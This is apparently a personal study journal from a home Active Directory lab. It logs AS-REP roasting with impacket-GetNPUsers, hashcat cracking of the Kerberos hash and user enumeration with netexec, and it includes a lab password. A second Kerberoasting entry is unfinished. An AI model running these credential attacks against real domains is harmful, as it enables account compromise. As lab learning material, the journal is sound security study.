# AD attacks and stuff I did

## 2/10/2026

**What I worked on:**
AS-REP roasting on the user of `ajones`, used `impacket-GetNPUsers` against `DC01` to get an AS-REP hash for ajones, whose pre-auth is disabled. Cracked the hash with hashcat using the seasons wordlist by seclists with the password manually added in.

**What Happened:**

Firstly I checked if my kali machine even sees the domain by running

```bash
netexec smb 192.168.100.10 -u '' -p ''
```

The output showed info about the server, OS info and who am I logged in as (guest)
```bash
SMB         192.168.100.10  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:lab.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.100.10  445    DC01             [+] lab.local\: 
```

After verifying that I can see the server, I tried finding ajones's hash by querying the server with a list.

```bash
impacket-getnpusers lab.local/ -dc-ip 192.168.100.10 -no-pass -usersfile /usr/share/seclists/usernames/names/names.txt
```

I had problems with that so I cheated a bit and pretended I already knew the username

```bash
impacket-GetNPUsers lab.local/ajones  -dc-ip 192.168.100.10 -no-pass
```

From there I've got the hash and copied over to a file named `hash.txt` for that file to be used in hashcat cracking.

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/seclists/Passwords/seasons.txt
```

`-m 18200` is used to emphasize it's being used against a kerberos hash, after a bit of problems with the wordlist (also used `rockyou.txt` and still nothing) I've added the password up to the wordlist just for the output of cracked in hashcat.

After retrieving the password through hashcat we can access the server as the user `asjones` using this command (and from there we can do stuff like users enumeration)

An example for users enumeration using the user credentials we just got:

```bash
netexec smb 192.168.100.10 -u 'ajones' -p 'Summer2023!' --users
```

**What worked:** 

- Checking if my machine saw the domain

- Getting the AS-REP for ajones after specifying the user I'm trying to log in as

- Cracking the hash after correcting the hash (I've copied it wrongly) and manually adding the password to the wordlist

- Querying the AD users with the found credentials

**Points to strengthen and shortcuts I took:**

- **Shortcut:** Manually adding the candidate I'm looking for to the searching tool.
  - **Point:** Figure out what to do when wordlists fail, know as much as you found, no knowledge from the full documentation

**What I didn't understand:**

How does the supposed hash or response came out of running `impacket-getnpusers` is structured and how to crack it/break it down, I had to pretend I have figured out what user is AS-REP roastable to then get this supposed hash as the username is not part of the wordlist. - I might've just copied the hash wrong, I forgot the part that comes before. 

## 4/10/2026

**What I worked on:**
Kerberoasting using the `ajones` user as a foothold, getting the password for the service users.

**What Happened:**

In this attack I will be using the `ajones` user as a foothold, I already have access to the AD via this user.

First I listed the users in the domain.
```bash
netexec smb 192.168.100.10 -u 'ajones' -p 'Summer2023!' --users
```

I can now find there are 2 users called `svc_sql` and `svc_backup`, I assume they are service users and so they might have SPNs setup so I'll try doing kerberoasting on them.

Requesting a TGS ticket for those SPNs (requesting for any of them)
```bash

```

Had some problems with mismatching the time between my kali machine and the server kerberos service.
The server is set to (-08:00) pacific time while Kali is synced with the local time, I'll try syncing either of these machines to make kerberos work.

Session was interrupted in the middle and the server lost power, I'll do it cleanly another time.

**What worked:**
**Points to strengthen and shortcuts I took:**
**What I didn't understand:**
